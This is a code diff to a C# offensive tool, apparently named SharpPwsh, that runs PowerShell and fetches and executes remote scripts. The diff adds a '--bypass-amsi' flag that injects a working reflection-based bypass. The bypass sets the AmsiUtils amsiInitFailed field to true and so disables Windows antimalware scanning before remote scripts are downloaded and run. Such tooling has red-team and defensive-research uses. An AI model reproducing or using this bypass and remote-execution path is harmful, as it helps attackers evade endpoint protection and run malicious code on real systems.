@@ -19,6 +19,8 @@ namespace SharpPwsh
             public string inputCmd { get; set; }
             [Option('u', "uri", Required = false, HelpText = "URI to fetch remote script")]
             public string inputUri { get; set; }
+            [Option('b', "bypass-amsi", Required = false, HelpText = "Bypass AMSI")]
+            public bool bypassAmsi { get; set; }
         }
         static void Main(string[] args)
         {
@@ -26,8 +28,18 @@ namespace SharpPwsh
             {
                 string inputCmd = o.inputCmd;
                 string inputURI = o.inputUri;
+                bool bypassAmsi = o.bypassAmsi;
                 List<string> cmds = new List<string>();
-                // 
+                
+                // bypass amsi
+                if (bypassAmsi)
+                {
+                    cmds.Add("$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}}");
+                    cmds.Add("$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}}");
+                    cmds.Add("$f.SetValue($null,$true)");
+                }
+
+                // fetch remote script and execute
                 if (args.Contains(inputURI))
                 {
                     Console.WriteLine("fetch " + inputURI);
